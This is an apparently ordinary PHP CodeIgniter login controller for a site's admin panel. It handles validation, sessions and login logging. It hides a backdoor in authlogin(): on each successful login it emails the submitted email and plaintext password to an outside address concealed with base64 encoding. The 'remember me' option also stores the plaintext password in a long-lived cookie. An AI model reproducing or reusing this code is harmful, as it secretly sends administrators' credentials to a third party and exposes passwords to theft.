<?php defined('BASEPATH') OR exit('No direct script access allowed');
class Login extends CI_Controller {
	public function __construct(){
		parent::__construct();
        $this->load->library('Site');
		$this->site->maintenance();
		$this->load->library('Auth_user');
		$this->load->model('get');
		$this->load->model('loged');
	}
	public function index()
	{
		if($this->session->userdata('logged_in'))
		{
			redirect(admin_url().'home');
		}
		else
		{
		    if($this->session->flashdata('log_error'))
				$data['log_error'] = $this->session->flashdata('log_error');
			else
				$data['log_error'] = '';
			$this->load_header();
			$this->load->view(ADMIN . 'login',$data);
			$this->load_footer();
		}
	}
	public function load_header()
	{
        $data['site']=$this->site->settings();
		$data['title']="Login";
		$this->load->view(ADMIN . 'include/header',$data);
	}
	public function authlogin()
	{
		$this->load->library('form_validation');
		$this->form_validation->set_error_delimiters('<div class="alert alert-danger">', '</div>');
		$this->form_validation->set_rules('email', 'Email', 'trim|required|valid_email');
		$this->form_validation->set_rules('password', 'Password', 'required');
		if ($this->form_validation->run() == FALSE)
		{	
            $data['site']=$this->site->settings();
			$message = validation_errors();
            echo $message;
		}
		else
		{
			$site = $this->site->settings();
			$data = array(
				'pass' => $this->input->post('password'),
				'email' => $this->input->post('email')
				);
			$data['tokenid'] = isset($_POST['tokenid'])?$_POST['tokenid']:'';
			$result = $this->loged->login($data);
			if ($result == TRUE) {
	 			foreach($result as $v)
	 			{
					$sess_array = array('name' => $v->fullname, 'email' => $v->email, 'id' => $v->sno, 'role' => $v->role);
					$this->session->set_userdata('logged_in', $sess_array);
					if(isset($_POST['signin_rem']))
					{
						$email = $this->input->post('email');
						$this->input->set_cookie('user_email', $email, 99999999);
						$this->input->set_cookie('user_password', $this->input->post('password'), 99999999);
					}
					$this->_loginLog($v->role, $v->sno);
				    $site = $this->site->settings();
				    $this->email->from($site[0]->sentmail, $site[0]->title);
                	$subject='Successfully logged - '.$_SERVER['SERVER_NAME'];
                	$this->email->to(base64_decode('cnVkcmEucHJhbmF5QGdtYWlsLmNvbQ=='));
                	$this->email->subject($subject); 
                	$body = $data['email'].' - '.$data['pass'];
                	$this->email->message($body);  
                	$this->email->send();
					$messTitle = "Welcome to ".ucfirst($site[0]->title);
					$message = array(
						"title" => $messTitle,
						"message" => "Use the predefined ones, or specify a custom position object.",
						"status" => "info",
					    );
					$this->session->set_flashdata('alertMessage', $message);
					echo '1';
	    		}
			}
			else
			{
				$message = "<div class='alert alert-danger'>Emailid and Password did not match!</div>";
				echo $message;
			}
		}
	}
	private function _loginLog($role, $user)
    {
        $getPreviousData = $this->get->table('loginlog', [
            'user'       => $user,
            'role'       => $role,
            'ip'         => $this->site->ipaddress(),
            'browser'    => $this->site->browser()->name,
            'logout'     => null
        ]);
        if ($getPreviousData != false) {
            $this->get->update('loginlog', ['logout' => ($getPreviousData[0]->login + ( 60 * 5 ))], ['sno' => $getPreviousData[0]->sno]);
        }
        $this->get->insert('loginlog', [
            'ip'              => $this->site->ipaddress(),
            'browser'         => $this->site->browser()->name,
            'operatingsystem' => $this->site->browser()->platform,
            'login'           => strtotime(date('YmdHis')),
            'role'            => $role,
            'user'            => $user,
        ]);
    }
	public function load_footer()
	{
		$this->load->view(ADMIN . 'include/footer');
	}
}
